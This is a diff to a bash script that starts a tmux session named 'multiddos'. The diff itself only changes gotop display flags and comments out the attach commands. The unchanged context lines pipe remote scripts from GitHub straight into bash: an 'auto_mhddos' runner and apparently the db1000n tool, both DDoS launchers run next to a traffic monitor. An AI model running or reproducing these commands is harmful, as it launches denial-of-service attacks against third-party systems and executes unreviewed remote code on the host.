@@ -25,7 +25,7 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
     sudo dpkg -i gotop.deb
 fi
 
-tmux new-session -s multiddos -d 'gotop -asc solarized'
+tmux new-session -s multiddos -d 'gotop -ac solarized'
 sleep 0.1
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
 sleep 0.1
@@ -33,5 +33,5 @@ tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/mai
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux select-pane -t 0
 sleep 0.1
-#tmux split-window -v 'vnstat -l'
-tmux a
+# tmux split-window -v 'vnstat -l'
+# tmux -2 attach-session -d
